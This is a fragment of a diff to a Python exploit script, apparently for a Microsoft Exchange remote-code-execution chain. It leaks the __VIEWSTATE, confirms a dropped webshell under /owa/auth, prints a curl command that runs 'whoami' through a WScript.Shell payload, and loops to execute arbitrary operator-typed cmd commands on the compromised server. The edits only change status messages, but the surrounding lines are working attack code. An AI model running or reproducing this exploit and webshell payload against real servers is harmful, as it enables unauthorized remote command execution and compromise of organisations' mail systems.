@@ -125,7 +125,7 @@ if ct.status_code != 200:
     print("Wrong canary!")
     print("Sometime we can skip this ...")
 x = re.findall("<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\" />", ct.text)
-print('Leaked viewstate: '+x[0])
+print('Got viewstate: '+x[0])
 print("=========== It means good to go!!!====")
 
 ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
@@ -196,6 +196,7 @@ req_test = requests.get('https://%s/aspnet_client/%s'%(target, shell_name), veri
 if "OAB (Default Web Site)" in req_test.text:
   print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
   print('(+) Code: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
+  print('(+) Starting semi-interactive')
   while True:
     cmd = input('CMD # ')
     shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())'''%cmd
